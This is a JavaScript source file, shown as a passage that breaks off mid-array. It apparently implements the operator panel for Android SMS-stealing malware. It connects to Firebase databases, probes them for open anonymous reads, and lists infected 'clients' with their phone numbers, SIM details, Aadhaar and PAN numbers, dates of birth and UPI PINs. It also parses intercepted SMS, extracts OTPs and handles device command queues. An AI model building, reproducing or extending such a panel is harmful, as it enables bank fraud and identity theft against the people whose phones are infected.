import { db, DEFAULT_DATABASE_URL, ACTIVE_DATABASE_URL } from "./cfg_51805.js";
import {
  ref,
  onValue,
  off,
  set,
  get,
  query,
  orderByKey,
  limitToLast,
} from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
import {
  SCHEMES,
  SCHEME_ORDER,
  isBaseKey,
  normalizeBasePath,
  baseLabel,
  discoverBases,
  scanAll,
  findOtpInMsgs,
  loadBadNumbers,
  parsePanelLink,
} from "./schemes.js";
import { databaseReadUrl, shallowReadUrl } from "./lib/firebase-rest.js";
import {
  carrierNamesForClient,
  firstSimMobile,
  hasClientRecords,
  mergeClientProfile,
  normalizeClientSims,
  parseDeviceInfoString,
  phoneNumbersForClient,
  providerForClient,
  simCountForClient,
} from "./lib/client-data.js";
// Reuse the existing Firebase write paths without adding UI controls or changing their payloads.
const writeData = (databaseRef, value) => set(databaseRef, value);
let currentActiveTab = "clients",
  selectedDeviceFilter = "all",
  structuralStatusFilter = "all",
  clientsData = {},
  messagesData = {},
  botUsersData = {},
  pinsData = {},
  callForData = {},
  isMessagesLoaded = !1,
  isClientsLoaded = !1,
  activeBase = "",
  discoveredBases = [""],
  baseDiscoverySource = "default",
  baseDiscoveryKeys = [],
  schemeResults = [],
  schemeLog = [],
  isSchemeScanning = !1,
  activeSubscriptions = [],
  schemeStatusText = "",
  schemeStatusColor = "#64748b";
const $ = (id) => document.getElementById(id),
  connectionUiStatus = $("connectionStatus"),
  searchInputElement = $("panelSearchInput"),
  deviceSearchInput = $("deviceSearchInput"),
  currentSelectionLabel = $("currentSelectionLabel"),
  deviceSidebarSection = $("deviceSidebarSection"),
  deviceTabsListContainer = $("deviceTabsListContainer"),
  exportDataBtn = $("exportDataBtn"),
  triggerSmsFetchBtn = $("triggerSmsFetchBtn"),
  activeDeviceFilterLabel = $("activeDeviceFilterLabel"),
  toastNotificationContainer = $("toastNotificationContainer"),
  menuDrawerToggleBtn = $("menuDrawerToggleBtn"),
  drawerBackdropOverlay = $("drawerBackdropOverlay"),
  closeDrawerBtn = $("closeDrawerBtn"),
  smsMessagesContainer = $("smsMessagesContainer"),
  DB_LIST_KEY = "fbmgr.databases",
  DB_ACTIVE_KEY = "fbmgr.activeDatabase";
let savedDatabases = [],
  activeDatabaseUrl = ACTIVE_DATABASE_URL || DEFAULT_DATABASE_URL,
  dbSwitchInFlight = !1;
function normalizeDbUrl(input) {
  if (!input) return null;
  let raw = String(input).trim();
  if (!raw) return null;
  const fromPanel = parsePanelLink(raw);
  (fromPanel && (raw = fromPanel),
    /^https?:\/\//i.test(raw) || (raw = "https://" + raw));
  let u;
  try {
    u = new URL(raw);
  } catch (e) {
    return null;
  }
  const host = u.hostname.toLowerCase();
  if (!(
    host.endsWith(".firebaseio.com") || host.endsWith(".firebasedatabase.app")
  ))
    return null;
  const auth = u.searchParams.get("auth") || u.searchParams.get("key"),
    base = u.origin + u.pathname.replace(/\/+$/, "");
  return auth ? `${base}?auth=${encodeURIComponent(auth)}` : base;
}
function dbUrlBase(url) {
  try {
    const u = new URL(url);
    return u.origin + u.pathname.replace(/\/+$/, "");
  } catch (e) {
    return String(url || "").replace(/\/+$/, "");
  }
}
function dbUrlAuth(url) {
  try {
    return new URL(url).searchParams.get("auth") || "";
  } catch (e) {
    return "";
  }
}
function dbShortName(url) {
  const base = dbUrlBase(url);
  try {
    return new URL(base).hostname
      .replace(/\.firebaseio\.com$/, "")
      .replace(/\.firebasedatabase\.app$/, "");
  } catch (e) {
    return base;
  }
}
function dbRegion(url) {
  const m = (() => {
    try {
      return new URL(dbUrlBase(url)).hostname;
    } catch (e) {
      return "";
    }
  })().match(/\.([a-z0-9-]+)\.firebasedatabase\.app$/);
  return m ? m[1] : "us-central1 (default)";
}
function loadDatabases() {
  try {
    const raw = localStorage.getItem(DB_LIST_KEY),
      arr = raw ? JSON.parse(raw) : [];
    savedDatabases = Array.isArray(arr) ? arr.filter((d) => d && d.url) : [];
  } catch (e) {
    savedDatabases = [];
  }
  const seen = new Set();
  savedDatabases = savedDatabases
    .map((d) => {
      const u = normalizeDbUrl(d.url) || d.url;
      return { ...d, url: u };
    })
    .filter((d) => {
      const k = dbUrlBase(d.url);
      return seen.has(k) ? !1 : (seen.add(k), !0);
    });
  const defUrl = normalizeDbUrl(DEFAULT_DATABASE_URL) || DEFAULT_DATABASE_URL;
  savedDatabases.some((d) => dbUrlBase(d.url) === dbUrlBase(defUrl)) ||
    savedDatabases.unshift({
      url: defUrl,
      label: "penal6 (default)",
      added: "built-in",
    });
  let active = null;
  try {
    active = localStorage.getItem(DB_ACTIVE_KEY);
  } catch (e) {}
  const activeNorm =
    (ACTIVE_DATABASE_URL ? normalizeDbUrl(ACTIVE_DATABASE_URL) : null) ||
    (active ? normalizeDbUrl(active) || active : null);
  return (
    (activeDatabaseUrl =
      activeNorm &&
      savedDatabases.some((d) => dbUrlBase(d.url) === dbUrlBase(activeNorm))
        ? savedDatabases.find((d) => dbUrlBase(d.url) === dbUrlBase(activeNorm))
            .url
        : activeNorm || defUrl),
    savedDatabases
  );
}
function persistDatabases() {
  try {
    localStorage.setItem(DB_LIST_KEY, JSON.stringify(savedDatabases));
  } catch (e) {}
  try {
    localStorage.setItem(DB_ACTIVE_KEY, activeDatabaseUrl);
  } catch (e) {}
}
function addDatabase(input, label) {
  const url = normalizeDbUrl(input);
  return url
    ? savedDatabases.some((d) => dbUrlBase(d.url) === dbUrlBase(url))
      ? { ok: !1, error: "That database is already in the list", url }
      : (savedDatabases.push({
          url,
          label: (label || "").trim() || dbShortName(url),
          added: new Date().toISOString(),
        }),
        persistDatabases(),
        { ok: !0, url })
    : { ok: !1, error: "Not a valid Firebase Realtime Database URL" };
}
function removeDatabase(url) {
  const key = dbUrlBase(url);
  if (key === dbUrlBase(DEFAULT_DATABASE_URL))
    return { ok: !1, error: "The built-in default database cannot be removed" };
  const before = savedDatabases.length;
  return (
    (savedDatabases = savedDatabases.filter((d) => dbUrlBase(d.url) !== key)),
    savedDatabases.length === before
      ? { ok: !1, error: "Database not found" }
      : (dbUrlBase(activeDatabaseUrl) === key &&
          (activeDatabaseUrl =
            normalizeDbUrl(DEFAULT_DATABASE_URL) || DEFAULT_DATABASE_URL),
        persistDatabases(),
        {
          ok: !0,
          switched:
            dbUrlBase(activeDatabaseUrl) === dbUrlBase(DEFAULT_DATABASE_URL),
        })
  );
}
async function probeDatabase(url) {
  const base = dbUrlBase(url),
    auth = dbUrlAuth(url),
    target =
      base +
      "/.json?shallow=true" +
      (auth ? "&auth=" + encodeURIComponent(auth) : ""),
    started = performance.now();
  try {
    const ctrl = new AbortController(),
      timer = setTimeout(() => ctrl.abort(), 8e3),
      r = await fetch(target, { signal: ctrl.signal });
    clearTimeout(timer);
    const ms = Math.round(performance.now() - started);
    if (r.status === 401 || r.status === 403)
      return {
        ok: !1,
        status: r.status,
        ms,
        error: "Permission denied — database rules block anonymous reads",
      };
    if (!r.ok)
      return { ok: !1, status: r.status, ms, error: "HTTP " + r.status };
    const data = await r.json(),
      keys = data && typeof data == "object" ? Object.keys(data) : [];
    return { ok: !0, status: r.status, ms, keys, keyCount: keys.length };
  } catch (e) {
    return {
      ok: !1,
      status: 0,
      ms: Math.round(performance.now() - started),
      error:
        e && e.name === "AbortError"
          ? "Timed out after 8s"
          : (e && e.message) || "Network error",
    };
  }
}
async function switchDatabase(url, opts) {
  const target = normalizeDbUrl(url);
  if (!target) return (toast("Invalid database URL", "error"), !1);
  if (dbSwitchInFlight)
    return (toast("A database switch is already running", "info"), !1);
  dbSwitchInFlight = !0;
  try {
    ((activeDatabaseUrl = target),
      persistDatabases(),
      renderDatabaseBar(),
      (!opts || !opts.silent) &&
        toast(`Switching to ${dbShortName(target)}…`, "info"));
    const u = new URL(location.href);
    return (
      u.searchParams.set("db", target),
      location.replace(u.toString()),
      !0
    );
  } catch (e) {
    return (
      toast("Switch failed: " + ((e && e.message) || e), "error"),
      (dbSwitchInFlight = !1),
      !1
    );
  }
}
function renderDatabaseBar() {
  const nameEl = $("activeDbName"),
    hostEl = $("activeDbHost"),
    dotEl = $("activeDbDot");
  (nameEl && (nameEl.textContent = dbShortName(activeDatabaseUrl)),
    hostEl &&
      (hostEl.textContent = dbUrlBase(activeDatabaseUrl).replace(
        /^https?:\/\//,
        "",
      )),
    dotEl &&
      (dotEl.className =
        "w-1.5 h-1.5 rounded-full flex-shrink-0 " +
        (dbSwitchInFlight ? "bg-amber-400 animate-pulse" : "bg-emerald-400")));
  const sel = $("dbQuickSelect");
  sel &&
    (sel.innerHTML = savedDatabases
      .map(
        (d) =>
          `<option value="${d.url}"${d.url === activeDatabaseUrl ? " selected" : ""}>${d.label || dbShortName(d.url)}</option>`,
      )
      .join(""));
}
function renderDatabaseManager() {
  const list = $("dbListContainer");
  if (list) {
    if (!savedDatabases.length) {
      list.innerHTML =
        '<div class="text-[10px] font-mono text-slate-600 py-2">No databases saved yet.</div>';
      return;
    }
    ((list.innerHTML = savedDatabases
      .map((d) => {
        const isActive = d.url === activeDatabaseUrl,
          isDefault = d.url === DEFAULT_DATABASE_URL;
        return `
      <div class="db-row bg-slate-950/60 border ${isActive ? "border-emerald-500/40" : "border-slate-800"} rounded-xl p-2.5 space-y-1.5" data-db-url="${d.url}">
        <div class="flex items-start justify-between gap-2">
          <div class="min-w-0 flex-1">
            <div class="flex items-center gap-1.5 flex-wrap">
              <span class="text-[11px] font-mono font-bold ${isActive ? "text-emerald-400" : "text-slate-200"} truncate">${d.label || dbShortName(d.url)}</span>
              ${isActive ? '<span class="bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 px-1 py-0.5 rounded text-[8px] font-bold">ACTIVE</span>' : ""}
              ${isDefault ? '<span class="bg-slate-800 text-slate-400 border border-slate-700 px-1 py-0.5 rounded text-[8px] font-bold">BUILT-IN</span>' : ""}
            </div>
            <div class="text-[9px] font-mono text-slate-500 break-all mt-0.5">${dbUrlBase(d.url).replace(/^https?:\/\//, "")}</div>
            <div class="text-[8px] font-mono text-slate-600 mt-0.5">${dbRegion(d.url)}${dbUrlAuth(d.url) ? " · auth token" : ""}</div>
          </div>
          <div class="flex items-center gap-1 flex-shrink-0">
            <button class="db-test-btn p-1.5 bg-slate-900 hover:bg-slate-800 border border-slate-800 rounded-lg text-slate-400 transition" data-db-url="${d.url}" title="Test connection">
              <span class="material-icons text-xs">network_check</span>
            </button>
            ${
              isActive
                ? ""
                : `<button class="db-use-btn p-1.5 bg-cyan-500/10 hover:bg-cyan-500/20 border border-cyan-500/30 rounded-lg text-cyan-400 transition" data-db-url="${d.url}" title="Use this database">
              <span class="material-icons text-xs">login</span>
            </button>`
            }
            ${
              isDefault
                ? ""
                : `<button class="db-del-btn p-1.5 bg-rose-500/10 hover:bg-rose-500/20 border border-rose-500/30 rounded-lg text-rose-400 transition" data-db-url="${d.url}" title="Remove">
              <span class="material-icons text-xs">delete</span>
            </button>`
            }
          </div>
        </div>
        <div class="db-probe-result text-[9px] font-mono text-slate-600" data-db-url="${d.url}"></div>
      </div>`;
      })
      .join("")),
      list.querySelectorAll(".db-test-btn").forEach((b) =>
        b.addEventListener("click", async () => {
          const url = b.getAttribute("data-db-url"),
            out = list.querySelector(`.db-probe-result[data-db-url="${url}"]`);
          ((b.disabled = !0),
            out &&
              ((out.textContent = "Testing…"), (out.style.color = "#64748b")));
          const r = await probeDatabase(url);
          (out &&
            ((out.textContent = r.ok
              ? `✓ reachable · ${r.ms} ms · ${r.keyCount} root key(s)${r.keys && r.keys.length ? " · " + r.keys.slice(0, 4).join(", ") : ""}`
              : `✗ ${r.error}${r.ms ? " · " + r.ms + " ms" : ""}`),
            (out.style.color = r.ok ? "#34d399" : "#fb7185")),
            toast(
              r.ok
                ? `${dbShortName(url)} reachable (${r.ms} ms)`
                : `${dbShortName(url)}: ${r.error}`,
              r.ok ? "success" : "error",
            ),
            (b.disabled = !1));
        }),
      ),
      list.querySelectorAll(".db-use-btn").forEach((b) =>
        b.addEventListener("click", async () => {
          (await switchDatabase(b.getAttribute("data-db-url")),
            renderDatabaseManager());
        }),
      ),
      list.querySelectorAll(".db-del-btn").forEach((b) =>
        b.addEventListener("click", () => {
          const url = b.getAttribute("data-db-url"),
            res = removeDatabase(url);
          if (!res.ok) {
            toast(res.error, "error");
            return;
          }
          (toast("Database removed", "info"),
            renderDatabaseManager(),
            renderDatabaseBar(),
            res.switched &&
              switchDatabase(DEFAULT_DATABASE_URL, { silent: !0 }));
        }),
      ));
  }
}
function openDatabaseManager() {
  const modal = $("dbManagerModal");
  if (!modal) return;
  (modal.classList.remove("hidden"), renderDatabaseManager());
  const input = $("dbUrlInput");
  input && setTimeout(() => input.focus(), 50);
}
function closeDatabaseManager() {
  const modal = $("dbManagerModal");
  modal && modal.classList.add("hidden");
}
async function submitNewDatabase() {
  const urlInput = $("dbUrlInput"),
    labelInput = $("dbLabelInput"),
    feedback = $("dbAddFeedback"),
    raw = urlInput ? urlInput.value : "";
  if (!raw || !raw.trim()) {
    toast("Paste a database URL first", "error");
    return;
  }
  const res = addDatabase(raw, labelInput ? labelInput.value : "");
  if (!res.ok) {
    (feedback &&
      ((feedback.textContent = res.error),
      (feedback.style.color = "#fb7185"),
      feedback.classList.remove("hidden")),
      toast(res.error, "error"));
    return;
  }
  (feedback &&
    ((feedback.textContent = "Added — testing connection…"),
    (feedback.style.color = "#22d3ee"),
    feedback.classList.remove("hidden")),
    urlInput && (urlInput.value = ""),
    labelInput && (labelInput.value = ""),
    renderDatabaseManager(),
    renderDatabaseBar());
  const probe = await probeDatabase(res.url);
  (feedback &&
    ((feedback.textContent = probe.ok
      ? `Added and reachable · ${probe.ms} ms · ${probe.keyCount} root key(s)`
      : `Added, but not readable: ${probe.error}`),
    (feedback.style.color = probe.ok ? "#34d399" : "#fbbf24")),
    toast(
      probe.ok
        ? `${dbShortName(res.url)} added and reachable`
        : `${dbShortName(res.url)} added — ${probe.error}`,
      probe.ok ? "success" : "info",
    ),
    probe.ok && (await switchDatabase(res.url, { silent: !0 })),
    renderDatabaseManager());
}
window.__dbManager = {
  list: () => savedDatabases.slice(),
  active: () => activeDatabaseUrl,
  add: addDatabase,
  remove: removeDatabase,
  probe: probeDatabase,
  switch: switchDatabase,
  normalize: normalizeDbUrl,
};
function isValidDeviceId(id) {
  return (
    id && typeof id == "string" && !(id.startsWith("{") && id.endsWith("}"))
  );
}
function getPhoneNumbers(client) {
  const numbers = phoneNumbersForClient(client);
  return numbers.length ? numbers : null;
}
function getProviderLabel(client) {
  return providerForClient(client);
}
function getCarriers(client) {
  return carrierNamesForClient(client);
}
function getSimBadge(client) {
  const n = getSimCount(client),
    saysDual = client && client.dualSim === !0;
  return n > 1
    ? { label: n + " SIM · DUAL", dual: !0 }
    : saysDual
      ? { label: "DUAL SIM", dual: !0 }
      : n === 1
        ? { label: "1 SIM", dual: !1 }
        : null;
}
function getSimCount(client) {
  return simCountForClient(client);
}
let detectedSchema = 1,
  schemaEvidence = [],
  schemaOverride = null,
  rootSmsQueueDetected = !1;
const SCHEMA_NAMES = {
  1: "Type 1 · clients/messages",
  2: "Type 2 · command queue",
  3: "Type 3 · RTX",
  4: "Type 4 · custom",
  5: "Type 5 · custom",
  6: "Type 6 · All_User Info+SimINFO",
  7: "Type 7 · All_Users DeviceInfo",
  8: "Type 8 · All_User Data+Commands",
  9: "Type 9 · All_User Info + root smsQueue",
  10: "Type 10 · user_data + user_sms",
};
function schemaName(t) {
  return SCHEMA_NAMES[t] || "Type " + t;
}
function effectiveSchema() {
  return schemaOverride !== null ? schemaOverride : detectedSchema;
}
function schemaIsManual() {
  return schemaOverride !== null;
}
function setSchemaOverride(v) {
  ((schemaOverride =
    v === "auto" || v === null || v === void 0 || v === ""
      ? null
      : parseInt(v, 10)),
    schemaOverride !== null &&
      (isNaN(schemaOverride) || schemaOverride < 1) &&
      (schemaOverride = null));
  try {
    localStorage.setItem(
      "fbSchemaOverride",
      schemaOverride === null ? "auto" : String(schemaOverride),
    );
  } catch (e) {}
  (detectSchema(),
    (resolvedNodePaths = {}),
    (resolvedCommandPath = null),
    (resolvedCommandRoot = !1),
    (rootSmsQueueDetected = !1),
    schemaOverride === null && ((detectedSchema = 1), (schemaEvidence = [])),
    loadSequentially(),
    toast(
      schemaOverride === null
        ? "Schema override cleared — auto-detect active"
        : "Schema forced to " + schemaName(schemaOverride) + " — reloading",
      "info",
    ));
}
function loadSchemaOverride() {
  try {
    const v = localStorage.getItem("fbSchemaOverride");
    if (v && v !== "auto") {
      const n = parseInt(v, 10);
      !isNaN(n) && n >= 1 && (schemaOverride = n);
    }
  } catch (e) {}
}
function firstOf(obj, keys) {
  if (!(!obj || typeof obj != "object")) {
    for (const k of keys)
      if (obj[k] !== void 0 && obj[k] !== null && obj[k] !== "") return obj[k];
  }
}
function isPingOnlyNode(node) {
  if (!node || typeof node != "object") return !1;
  const keys = Object.keys(node).filter(isValidDeviceId);
  if (!keys.length) return !1;
  return keys.every((k) => {
    const v = node[k];
    if (!v || typeof v != "object") return !1;
    const f = Object.keys(v);
    return f.length > 0 && f.every((x) => x === "ping");
  });
}
function detectSchema() {
  const evidence = [];
  let type = 1;
  const cp = resolvedNodePaths.clients || "";
  /All_Users\/DeviceInfo/i.test(cp)
    ? ((type = 7),
      evidence.push("clients read from All_Users/DeviceInfo → SIM-map layout"))
    : /All_User\/Data|All_Users\/Data/i.test(cp)
      ? ((type = 8),
        evidence.push("clients read from All_User/Data → data+commands layout"))
      : /All_User\/Info|All_User\/DeviceInfo/i.test(cp) &&
        ((type = 6),
        evidence.push("clients read from All_User/Info → info+SimINFO layout"));
  if (type === 6 && rootSmsQueueDetected) {
    ((type = 9),
      evidence.push(
        "no All_User/Commands node, but root /smsQueue exists → root trigger layout",
      ));
  }
  if (/^user_data$/i.test(cp)) {
    ((type = 10),
      evidence.push(
        "clients read from user_data → user_data + user_sms layout",
      ));
  }
  const clientKeys = clientsData
      ? Object.keys(clientsData).filter(isValidDeviceId)
      : [],
    rawFirstKey =
      rawClientsNode && typeof rawClientsNode == "object"
        ? Object.keys(rawClientsNode).find(isValidDeviceId)
        : null,
    rawFirst = rawFirstKey ? rawClientsNode[rawFirstKey] : null;
  if (type === 1 && clientKeys.length) {
    const c =
      rawFirst && typeof rawFirst == "object"
        ? rawFirst
        : clientsData[clientKeys[0]];
    c &&
      typeof c == "object" &&
      (c.Sim1 !== void 0 || c.device_name !== void 0 || c.charge !== void 0
        ? ((type = 3),
          evidence.push("clients carry Sim1/device_name/charge → RTX layout"))
        : (c.sims !== void 0 || c.mobNo !== void 0 || c.modelName !== void 0) &&
          evidence.push(
            "clients carry sims/mobNo/modelName → standard layout",
          ));
  }
  if (type === 1 && clientKeys.length) {
    const c = clientsData[clientKeys[0]];
    c &&
      typeof c == "object" &&
      (c.aadhaar !== void 0 ||
        c.panCard !== void 0 ||
        c.dob !== void 0 ||
        c.Aadhaar !== void 0 ||
        c.PanCard !== void 0 ||
        c.Dob !== void 0) &&
      ((type = 8),
      evidence.push(
        "clients carry Aadhaar/PanCard/Dob → data+commands layout",
      ));
  }
  if (type === 1 && rawClientsNode && isPingOnlyNode(rawClientsNode)) {
    evidence.push(
      "clients node holds only ping records → not a device inventory",
    );
  }
  if (type !== 3 && messagesData && Object.keys(messagesData).length) {
    const k = Object.keys(messagesData)[0],
      m = messagesData[k];
    m &&
      typeof m == "object" &&
      m.sendSms !== void 0 &&
      ((type = 2),
      evidence.push("messages carry sendSms → command-queue layout"));
  }
  return (
    evidence.length ||
      evidence.push("no distinguishing fields found → default layout"),
    (detectedSchema = type),
    (schemaEvidence = evidence),
    renderSchemaBadge(),
    type
  );
}
function renderSchemaBadge() {
  const el = $("schemaBadge");
  if (!el) return;
  const t = effectiveSchema();
  ((el.textContent = schemaName(t) + (schemaIsManual() ? " · manual" : "")),
    (el.title = schemaIsManual()
      ? `Manual override. Auto-detect said ${schemaName(detectedSchema)} — ${schemaEvidence.join(" · ")}`
      : schemaEvidence.join(" · ")),
    el.classList.toggle("text-amber-400", schemaIsManual()),
    el.classList.toggle("border-amber-500/40", schemaIsManual()),
    el.classList.toggle("text-slate-500", !schemaIsManual()),
    el.classList.toggle("border-slate-800", !schemaIsManual()));
}
function toBoolStatus(v) {
  if (v === !0 || v === !1) return v;
  if (v == null) return !1;
  const s = String(v).trim().toLowerCase();
  return (
    s === "true" ||
    s === "online" ||
    s === "on" ||
    s === "active" ||
    s === "1" ||
    s === "yes"
  );
}
function normalizeClient(raw, sim) {
  if (!raw || typeof raw != "object") return null;
  raw = mergeClientProfile(raw);
  const rawDeviceInfo = firstOf(raw, ["Device_info", "device_info", "DeviceInfo", "deviceInfo"]),
    dinfo =
      typeof rawDeviceInfo === "string"
        ? parseDeviceInfoString(rawDeviceInfo)
        : rawDeviceInfo && typeof rawDeviceInfo === "object"
          ? rawDeviceInfo
          : {};
  raw = mergeClientProfile({ ...dinfo, ...raw });
  const c = { ...raw },
    osVersion = firstOf(dinfo, ["os", "osVersion", "androidVersion"]);
  if (
    (c.modelName ||
      (c.modelName =
        firstOf(raw, [
          "Name",
          "name",
          "device_name",
          "deviceName",
          "device_name_model",
          "model",
          "Model",
          "model_name",
          "modelName",
          "device_model",
          "deviceModel",
          "phoneModel",
          "brand",
          "manufacturer",
          "product",
          "label",
          "d_name",
        ]) ||
        firstOf(dinfo, ["model", "Model", "modelName", "deviceName", "name"]) ||
        "Unknown Device"),
    c.battery === void 0 || c.battery === null || c.battery === "")
  ) {
    const b = firstOf(raw, [
      "Battery",
      "battery",
      "charge",
      "batteryLevel",
      "BatteryLevel",
      "battery_level",
      "battery_percentage",
      "batteryPercent",
      "bat",
    ]);
    b !== void 0 && (c.battery = b);
  }
  if (typeof c.status != "boolean") {
    const sv = firstOf(raw, [
      "status",
      "Status",
      "online",
      "isOnline",
      "active",
    ]);
    sv !== void 0 && (c.status = toBoolStatus(sv));
  }
  if (c.status === void 0) {
    const s = firstOf(raw, [
      "Status",
      "status",
      "online",
      "isOnline",
      "active",
    ]);
    s !== void 0 && (c.status = toBoolStatus(s));
  }
  const normalizedSims = normalizeClientSims(raw, sim);
  c.sims = normalizedSims;
  if (!c.mobNo) {
    const m = firstOf(raw, [
      "phoneNumber",
      "phone",
      "number",
      "msisdn",
      "mobile",
      "mobileNumber",
      "mobile_number",
      "mobileNo",
      "mobile_no",
      "mob_no",
      "phone_number",
      "phoneNo",
      "phone_no",
      "contactNumber",
      "Number",
      "Mobile",
      "MobileNo",
    ]);
    (typeof m === "string" || typeof m === "number") &&
      String(m).trim() &&
      (c.mobNo = String(m).trim());
  }
  const primaryMobile =
    typeof c.mobNo === "string" || typeof c.mobNo === "number"
      ? String(c.mobNo).trim()
      : "";
  if (primaryMobile.replace(/\D/g, "").length >= 10) {
    const primarySim = c.sims.find((entry) => !entry.phoneNumber);
    if (primarySim) primarySim.phoneNumber = primaryMobile;
    else if (!c.sims.length) c.sims = [{ phoneNumber: primaryMobile, slot: 1 }];
  }
  const explicitDualSim =
    firstOf(raw, ["dualSim", "dualsim", "isDualSim", "is_dual_sim", "DualSim", "DualSIM"]) ??
    firstOf(sim && typeof sim === "object" ? sim : {}, [
      "dualSim", "dualsim", "isDualSim", "is_dual_sim", "DualSim", "DualSIM",
    ]);
  if (c.dualSim === void 0 && explicitDualSim !== void 0) {
    c.dualSim = toBoolStatus(explicitDualSim);
  }
  if (c.dualSim === void 0 && c.sims.length > 1) c.dualSim = !0;
  if (
    (c.person || (c.person = firstOf(raw, ["Name", "name"])),
    c.aadhaar || (c.aadhaar = firstOf(raw, ["Aadhaar", "aadhaar", "aadhar"])),
    c.panCard ||
      (c.panCard = firstOf(raw, ["PanCard", "pancard", "pan", "PAN"])),
    c.dob || (c.dob = firstOf(raw, ["Dob", "DOB", "dob", "birthDate"])),
    !c.service_provider)
  ) {
    const p = firstOf(raw, [
      "carrier",
      "carrierName",
      "carrier_name",
      "operator",
      "network",
      "provider",
      "serviceProvider",
      "simOperator",
      "networkOperator",
    ]);
    p && (c.service_provider = String(p).trim());
  }
  if (
    (c.ip_address ||
      (c.ip_address = firstOf(raw, [
        "ip", "IP", "ipAddress", "ip_address", "IP_Address", "last_ip", "lastIp",
      ]) || firstOf(dinfo, ["ip", "ipAddress", "ip_address", "IP_Address"])),
    c.androidV ||
      (c.androidV = firstOf(raw, [
        "androidVersion",
        "android_version",
        "osVersion",
        "os_version",
        "sdk",
        "sdkV",
      ]) ||
        (osVersion == null
          ? void 0
          : String(osVersion).replace(/^Android\s*/i, ""))),
    c.cpu_arch || (c.cpu_arch = firstOf(raw, ["cpuArch", "arch", "abi"])),
    c.storage ||
      (c.storage = firstOf(raw, ["totalStorage", "storageTotal", "disk"])),
    c.joined ||
      (c.joined = firstOf(raw, [
        "joinedAt",
        "firstSeen",
        "created",
        "createdAt",
        "installTime",
      ])),
    c.lastSeen ||
      (c.lastSeen = firstOf(raw, ["TimeandDate", "lastSeen", "last_seen"])),
    c.isRoot === void 0)
  ) {
    const r = firstOf(raw, ["rooted", "isRooted", "root"]);
    r !== void 0 && (c.isRoot = r === !0 || r === "true" || r === 1);
  }
  c.androidV != null &&
    (c.androidV = String(c.androidV).replace(/^Android\s*/i, ""));
  return (
    c.upipin || (c.upipin = firstOf(raw, ["upiPin", "upi_pin", "pin"])),
    c
  );
}
function normalizeClients(node, simsNode) {
  if (!node || typeof node != "object") return {};
  const out = {};
  return (
    Object.keys(node).forEach((k) => {
      if (!isValidDeviceId(k)) return;
      const rawNode = node[k];
      if (!rawNode || typeof rawNode != "object") return;
      const profileNode = mergeClientProfile(rawNode),
        deviceField = profileNode.device,
        did =
          profileNode.did ||
          profileNode.Did ||
          (typeof deviceField === "string" || typeof deviceField === "number"
            ? deviceField
            : firstOf(profileNode, ["deviceId", "device_id", "id"])) ||
          k,
        sim =
          (simsNode &&
            typeof simsNode == "object" &&
            (simsNode[did] || simsNode[k])) ||
          null,
        n = (() => {
          try {
            return normalizeClient(profileNode, sim);
          } catch (error) {
            console.warn(`[clients] profile ${k} normalization failed:`, error);
            return { ...profileNode, modelName: "Unknown Device" };
          }
        })();
      n &&
        ((n.modelName =
          typeof n.modelName === "string" || typeof n.modelName === "number"
            ? String(n.modelName)
            : "Unknown Device"),
        (n.clientId = k),
        (n.deviceId = String(did)),
        n.mobNo != null && typeof n.mobNo !== "object" && (n.mobNo = String(n.mobNo)),
        !n.mobNo && (n.mobNo = firstSimMobile(n.sims)),
        (out[String(did)] = n));
    }),
    out
  );
}
function normalizeMessage(entry, msgKey, deviceId) {
  if (!entry || typeof entry != "object") return null;
  const src =
    entry.sendSms && typeof entry.sendSms == "object"
      ? { ...entry, ...entry.sendSms }
      : entry;
  let ts = 0;
  const keyNum = parseInt(msgKey, 10);
  if ((keyNum > 1e12 && (ts = keyNum), !ts && src.id)) {
    const n = parseInt(src.id, 10);
    n > 1e12 && (ts = n);
  }
  if (!ts)
    for (const tk of [
      "ts",
      "timestamp",
      "time",
      "date",
      "dateTime",
      "recivedDate",
      "receivedDate",
    ]) {
      const raw = src[tk];
      if (raw == null || raw === "") continue;
      const n = parseInt(String(raw).replace(/\D/g, ""), 10);
      if (!isNaN(n) && n > 1e11) {
        ts = n < 1e11 ? n * 1e3 : n;
        break;
      }
    }
  return {
    deviceId,
    sender:
      firstOf(src, [
        "sender",
        "from",
        "ph",
        "address",
        "number",
        "phoneNumber",
      ]) || "Unknown",
    message:
      firstOf(src, ["message", "msg", "text", "body", "content", "SMS"]) || "",
    dateTime:
      firstOf(src, [
        "dateTime",
        "time",
        "recivedDate",
        "receivedDate",
        "date",
      ]) || "",
    type: firstOf(src, ["type", "direction", "msgType"]) || "RAW",
    timestamp: ts,
    id: msgKey,
  };
}
function normalizeMessages(node) {
  if (!node || typeof node != "object") return {};
  const out = {};
  return (
    Object.keys(node).forEach((devId) => {
      if (!isValidDeviceId(devId)) return;
      const logs = node[devId];
      if (!logs || typeof logs != "object") return;
      const devOut = {};
      (Object.keys(logs).forEach((mk) => {
        const n = normalizeMessage(logs[mk], mk, devId);
        n && (devOut[mk] = n);
      }),
        Object.keys(devOut).length && (out[devId] = devOut));
    }),
    out
  );
}
function basePath(node) {
  const b = activeBase.replace(/^\/+|\/+$/g, ""),
    n = String(node).replace(/^\/+|\/+$/g, "");
  return "/" + [b, n].filter(Boolean).join("/");
}
function detachAll() {
  (activeSubscriptions.forEach(({ r, cb }) => {
    try {
      off(r, "value", cb);
    } catch (e) {}
  }),
    (activeSubscriptions = []));
}
const LOAD_STEPS = [
    { key: "clients", label: "clients" },
    { key: "messages", label: "messages" },
    { key: "bot_users", label: "bot_users" },
    { key: "pins", label: "pins" },
  ],
  SCHEMA_NODE_ALIASES = {
    1: {
      clients: ["clients"],
      messages: ["messages"],
      bot_users: ["bot_users"],
      pins: ["pins"],
    },
    2: {
      clients: ["clients", "devices", "device_commands"],
      messages: ["messages", "commands", "device_commands"],
      bot_users: ["bot_users"],
      pins: ["pins"],
    },
    3: {
      clients: ["clients", "data", "devices"],
      messages: ["messages", "data", "common"],
      bot_users: ["bot_users"],
      pins: ["pins"],
    },
    4: {
      clients: ["clients", "users", "accounts", "data"],
      messages: ["messages", "sms", "logs", "data"],
      bot_users: ["bot_users", "bots", "users"],
      pins: ["pins", "config", "settings"],
    },
    5: {
      clients: ["clients", "nodes", "items", "records", "data"],
      messages: ["messages", "sms", "queue", "logs", "data"],
      bot_users: ["bot_users", "bots", "agents"],
      pins: ["pins", "config", "meta"],
    },
    6: {
      clients: [
        "All_User/Info",
        "All_Users/Info",
        "All_User/DeviceInfo",
        "All_Users/DeviceInfo",
      ],
      messages: [
        "All_User/Sms",
        "All_Users/Sms",
        "All_User/SMS",
